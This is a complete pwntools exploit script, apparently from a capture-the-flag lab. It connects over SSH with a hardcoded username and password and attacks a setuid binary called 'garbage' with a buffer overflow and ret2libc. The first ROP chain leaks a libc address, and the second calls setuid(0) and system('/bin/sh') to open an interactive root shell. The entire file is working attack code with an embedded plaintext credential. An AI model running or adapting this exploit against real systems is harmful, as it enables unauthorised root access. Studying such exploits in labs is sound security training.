from pwn import *

context(terminal=['tmux', 'new-window'])
session = ssh('margo', '10.10.10.139', password='iamgod$08')

p = session.process('/usr/bin/garbage')
#p = gdb.debug('./garbage', 'b main')

context(os='linux', arch='amd64')
#context.log_level = 'DEBUG'

# make sure these are local and freshly grabbed from remote with correct permissions
garbage = ELF('garbage')
rop = ROP(garbage)
libc = ELF('libc.so.6')
junk = "A" * 136

# build rop chain
rop.search(regs=['rdi'], order='regs')
rop.puts(garbage.got['puts'])
rop.call(garbage.symbols['main'])
print "ROP Chain 1:\n{}".format(rop.dump())

payload = junk + str(rop)
p.recvuntil('password:')
p.sendline(payload)
p.recvuntil('denied.')

leaked_puts_address_in_libc = p.recv()[:8].strip().ljust(8, "\x00")
print("Leaked puts@GLIBCL {}".format(str(leaked_puts_address_in_libc)))
# unpack
leaked_puts_address_in_libc = u64(leaked_puts_address_in_libc)

libc.address = leaked_puts_address_in_libc - libc.symbols['puts']
rop2 = ROP(libc)
rop2.setuid(0x0)
rop2.system(next(libc.search('/bin/sh\x00')))
print "ROP Chain 2:\n{}".format(rop2.dump())

payload = junk + str(rop2)
p.sendline(payload)
p.recvuntil('denied.')

p.interactive()
